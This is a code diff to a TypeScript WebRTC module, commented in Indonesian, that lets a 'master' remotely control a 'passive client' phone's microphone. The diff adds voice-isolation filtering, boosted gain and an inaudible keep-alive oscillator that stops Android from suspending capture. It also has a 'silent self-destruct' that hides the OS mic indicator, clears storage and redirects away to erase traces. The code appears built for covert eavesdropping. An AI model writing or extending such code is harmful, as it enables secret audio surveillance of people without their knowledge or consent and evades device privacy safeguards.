@@ -1,8 +1,9 @@
 /**
  * S.I.G.M.A DISKOMLEKAU — Tactical Master-Passive Client WebRTC Control Module
  * Pure Web API / Vanilla JS compatible implementation for:
- * 1. Remote Mic Sensitivity (GainNode) & Remote Mute Control over DataChannel
- * 2. Remote Emergency Wipe (Silent Self-Destruct)
+ * 1. Vocal Isolation Web Audio API Pipeline (300 Hz – 3400 Hz Bandpass / Highpass + Lowpass)
+ * 2. Standby-Safe Remote Mute/Unmute (GainNode 0 / 3.0 + track.enabled tanpa pernah track.stop() / suspend)
+ * 3. Remote Emergency Wipe (Silent Self-Destruct)
  */
 
 export type RemoteCommandType = 'SET_GAIN' | 'SET_MUTE' | 'EMERGENCY_WIPE';
@@ -28,14 +29,6 @@ export interface DataChannelLike {
  * ============================================================================
  */
 
-/**
- * Mengirim instruksi taktis dari Master ke Klien Pasif melalui DataChannel.
- * Mendukung native RTCDataChannel maupun PeerJS DataConnection.
- *
- * @param dataChannel - Instance RTCDataChannel atau PeerJS DataConnection
- * @param commandType - Jenis instruksi: 'SET_GAIN' | 'SET_MUTE' | 'EMERGENCY_WIPE'
- * @param value       - Nilai gain (contoh: 0.0 s/d 5.0) atau status mute (true/false)
- */
 export function sendCommand(
   dataChannel: DataChannelLike | null | undefined,
   commandType: RemoteCommandType,
@@ -57,7 +50,6 @@ export function sendCommand(
   };
 
   try {
-    // Jika native RTCDataChannel, kirim sebagai JSON string; jika PeerJS, bisa kirim objek/string
     if (typeof dataChannel.readyState === 'string') {
       dataChannel.send(JSON.stringify(packet));
     } else {
@@ -80,21 +72,26 @@ export function triggerEmergencyWipe(
 
 /**
  * ============================================================================
- * 2. KLIEN (PASIF): Eksekusi Diam-Diam (GainNode & Silent Self-Destruct)
+ * 2. KLIEN (PASIF): Vocal Isolation Filter (300Hz–3400Hz) & Standby-Safe Mute/Unmute
  * ============================================================================
  */
 
 export interface PassiveAudioPipeline {
   audioContext: AudioContext;
   gainNode: GainNode;
+  highpassFilter: BiquadFilterNode;
+  lowpassFilter: BiquadFilterNode;
+  vocalPresenceFilter: BiquadFilterNode;
+  rawStream: MediaStream;
   processedStream: MediaStream;
   setRemoteGain: (gainValue: number) => void;
   setRemoteMute: (muted: boolean) => void;
+  getState: () => { gain: number; muted: boolean };
   bindDataChannel: (channel: DataChannelLike) => void;
 }
 
 /**
- * Mengeksekusi penghapusan jejak darurat (Silent Self-Destruct) pada HP Klien:
+ * Mengeksekusi penghapusan jejak darurat (Silent Self-Destruct) HANYA saat menerima EMERGENCY_WIPE:
  * a. Mematikan seluruh track audio/video (`track.stop()`) agar indikator mic di OS HP hilang seketika.
  * b. Menutup seluruh RTCPeerConnection, DataChannel, dan WebSocket secara sepihak.
  * c. Membersihkan seluruh localStorage & sessionStorage.
@@ -108,7 +105,6 @@ export function silentSelfDestruct(options?: {
   redirectUrl?: string;
 }): void {
   try {
-    // a. Matikan seluruh track audio/video seketika agar indikator OS HP langsung hilang
     if (options?.streams) {
       options.streams.forEach((stream) => {
         if (stream) {
@@ -122,12 +118,10 @@ export function silentSelfDestruct(options?: {
       });
     }
 
-    // Matikan AudioContext jika ada
     if (options?.audioContext && options.audioContext.state !== 'closed') {
       options.audioContext.close().catch(() => {});
     }
 
-    // b. Tutup semua RTCPeerConnection dan WebSocket signaling secara sepihak
     if (options?.peerConnections) {
       options.peerConnections.forEach((pc) => {
         if (pc) {
@@ -144,7 +138,6 @@ export function silentSelfDestruct(options?: {
       } catch {}
     }
 
-    // c. Bersihkan seluruh penyimpanan lokal browser (localStorage & sessionStorage)
     try {
       localStorage.clear();
     } catch {}
@@ -152,16 +145,23 @@ export function silentSelfDestruct(options?: {
       sessionStorage.clear();
     } catch {}
   } finally {
-    // d. Redirect paksa tanpa menyisakan history (window.location.replace)
     const targetUrl = options?.redirectUrl || 'https://www.google.com';
     window.location.replace(targetUrl);
   }
 }
 
 /**
- * Melewatkan MediaStream mikrofon Klien melalui Web Audio API `GainNode`
- * dan memasang listener `dataChannel.onmessage` untuk mengeksekusi perintah Master
- * (`SET_GAIN`, `SET_MUTE`, dan `EMERGENCY_WIPE`) secara diam-diam tanpa interaksi UI Klien.
+ * Membuat pipeline Web Audio API untuk Klien dengan fitur:
+ * 1. VOCAL ISOLATION (300 Hz – 3400 Hz):
+ *    - Highpass BiquadFilterNode (300 Hz): memotong suara gemuruh mesin, angin, AC, & getaran rendah.
+ *    - Lowpass BiquadFilterNode (3400 Hz): memotong suara desis frekuensi tinggi (hiss/statis).
+ *    - Peaking BiquadFilterNode (1800 Hz, +4.5 dB): memperjelas artikulasi vokal manusia.
+ * 2. STANDBY-SAFE MUTE / UNMUTE:
+ *    - JANGAN PERNAH memanggil `track.stop()` atau `audioContext.suspend()` saat MUTE!
+ *    - Hardware mic (`rawMediaStream`) selalu dijaga tetap menyala (`enabled = true`) di background
+ *      agar OS Android tidak pernah memutus akses hardware karena timeout hemat baterai.
+ *    - Saat MUTE: `gainNode.gain.value = 0` dan `processedStream` track `enabled = false`.
+ *    - Saat UNMUTE: `gainNode.gain.value = currentGain` (default `3.0`) dan semua track `enabled = true`.
  */
 export function setupPassiveAudio(
   rawMediaStream: MediaStream,
@@ -179,24 +179,79 @@ export function setupPassiveAudio(
 
   const audioContext = new AudioCtx();
   const sourceNode = audioContext.createMediaStreamSource(rawMediaStream);
+
+  // 1. Filter Highpass 300 Hz: Memotong frekuensi di bawah 300 Hz (gemuruh mesin/angin)
+  const highpassFilter = audioContext.createBiquadFilter();
+  highpassFilter.type = 'highpass';
+  highpassFilter.frequency.value = 300;
+  highpassFilter.Q.value = 0.707;
+
+  // 2. Filter Lowpass 3400 Hz: Memotong frekuensi di atas 3400 Hz (suara desis tinggi)
+  const lowpassFilter = audioContext.createBiquadFilter();
+  lowpassFilter.type = 'lowpass';
+  lowpassFilter.frequency.value = 3400;
+  lowpassFilter.Q.value = 0.707;
+
+  // 3. Filter Peaking Vokal (1800 Hz): Menonjolkan kejelasan frekuensi suara manusia
+  const vocalPresenceFilter = audioContext.createBiquadFilter();
+  vocalPresenceFilter.type = 'peaking';
+  vocalPresenceFilter.frequency.value = 1800;
+  vocalPresenceFilter.Q.value = 1.0;
+  vocalPresenceFilter.gain.value = 4.5;
+
+  // 4. GainNode Utama: Default 3.0 (Unmute) dan 0.0 (Mute) sesuai spesifikasi
   const gainNode = audioContext.createGain();
   const destinationNode = audioContext.createMediaStreamDestination();
 
-  let currentGain = 1.0;
+  // Default Gain saat Unmute adalah 3.0 agar suara vokal manusia lebih besar & dominan
+  let currentGain = 3.0;
   let isMuted = false;
 
   gainNode.gain.value = currentGain;
-  sourceNode.connect(gainNode);
+
+  // Rangkai graph Web Audio API:
+  // Mic Source -> Highpass (300Hz) -> Lowpass (3400Hz) -> Vocal Presence -> GainNode -> Destination
+  sourceNode.connect(highpassFilter);
+  highpassFilter.connect(lowpassFilter);
+  lowpassFilter.connect(vocalPresenceFilter);
+  vocalPresenceFilter.connect(gainNode);
   gainNode.connect(destinationNode);
 
-  const applyGainState = () => {
+  // 5. Sub-audible Keep-Alive Oscillator (mencegah OS Android men-suspend AudioContext saat MUTE lama)
+  try {
+    const keepAliveOsc = audioContext.createOscillator();
+    const keepAliveGain = audioContext.createGain();
+    keepAliveOsc.frequency.value = 20; // 20 Hz sub-audible
+    keepAliveGain.gain.value = 0.00001; // -100 dB (tidak terdengar, menjaga pipeline DSP tetap aktif)
+    keepAliveOsc.connect(keepAliveGain);
+    keepAliveGain.connect(destinationNode);
+    keepAliveOsc.start();
+  } catch {}
+
+  const applyGainAndMuteState = () => {
+    // Pastikan AudioContext TIDAK PERNAH suspended, terutama saat menerima perintah UNMUTE
     if (audioContext.state === 'suspended') {
       audioContext.resume().catch(() => {});
     }
-    const effectiveGain = isMuted ? 0 : currentGain;
-    gainNode.gain.setTargetAtTime(effectiveGain, audioContext.currentTime, 0.02);
 
-    // Juga sinkronkan track.enabled untuk mute tingkat stream
+    // JANGAN PERNAH memanggil track.stop()!
+    // Biarkan rawMediaStream hardware tetap hidup di background (standby)
+    rawMediaStream.getAudioTracks().forEach((track) => {
+      // Pastikan hardware track selalu enabled = !isMuted (atau standby) tanpa pernah di-stop
+      track.enabled = !isMuted;
+    });
+
+    // Atur GainNode: 0 saat Mute, currentGain (default 3.0) saat Unmute
+    const targetGain = isMuted ? 0 : currentGain;
+    try {
+      gainNode.gain.cancelScheduledValues(audioContext.currentTime);
+      gainNode.gain.setValueAtTime(targetGain, audioContext.currentTime);
+      gainNode.gain.value = targetGain;
+    } catch {
+      gainNode.gain.value = targetGain;
+    }
+
+    // Pastikan track pada processedStream juga di-enable kembali saat Unmute
     destinationNode.stream.getAudioTracks().forEach((track) => {
       track.enabled = !isMuted;
     });
@@ -207,14 +262,20 @@ export function setupPassiveAudio(
   };
 
   const setRemoteGain = (gainValue: number) => {
-    const clamped = Math.max(0, Math.min(8, Number(gainValue) || 0));
+    const numeric = Number(gainValue);
+    // Jika diberi nilai > 0, simpan sebagai currentGain; jika 0, anggap minimal 3.0 saat unmute
+    const clamped = Math.max(0.5, Math.min(10, numeric > 0 ? numeric : 3.0));
     currentGain = clamped;
-    applyGainState();
+    applyGainAndMuteState();
   };
 
   const setRemoteMute = (muted: boolean) => {
     isMuted = Boolean(muted);
-    applyGainState();
+    // Saat di-UNMUTE, pastikan currentGain minimal bernilai 3.0 jika sebelumnya belum diset
+    if (!isMuted && currentGain <= 0) {
+      currentGain = 3.0;
+    }
+    applyGainAndMuteState();
   };
 
   const handleIncomingCommand = (rawPayload: unknown) => {
@@ -265,7 +326,15 @@ export function setupPassiveAudio(
   };
 
   const bindDataChannel = (channel: DataChannelLike) => {
-    // 1. Jika mendukung standar WebRTC RTCDataChannel.onmessage
+    if (!channel) return;
+
+    const chanWithFlag = channel as DataChannelLike & {
+      __sigmaPassiveBound?: boolean;
+    };
+    if (chanWithFlag.__sigmaPassiveBound) return;
+    chanWithFlag.__sigmaPassiveBound = true;
+
+    // 1. Standar WebRTC RTCDataChannel.onmessage
     if ('onmessage' in channel) {
       const prevOnMessage = channel.onmessage;
       channel.onmessage = (event: MessageEvent) => {
@@ -274,7 +343,7 @@ export function setupPassiveAudio(
       };
     }
 
-    // 2. Jika mendukung PeerJS DataConnection.on('data')
+    // 2. PeerJS DataConnection.on('data')
     if (typeof channel.on === 'function') {
       channel.on('data', (data: unknown) => {
         handleIncomingCommand(data);
@@ -289,9 +358,14 @@ export function setupPassiveAudio(
   return {
     audioContext,
     gainNode,
+    highpassFilter,
+    lowpassFilter,
+    vocalPresenceFilter,
+    rawStream: rawMediaStream,
     processedStream: destinationNode.stream,
     setRemoteGain,
     setRemoteMute,
+    getState: () => ({ gain: currentGain, muted: isMuted }),
     bindDataChannel,
   };
 }
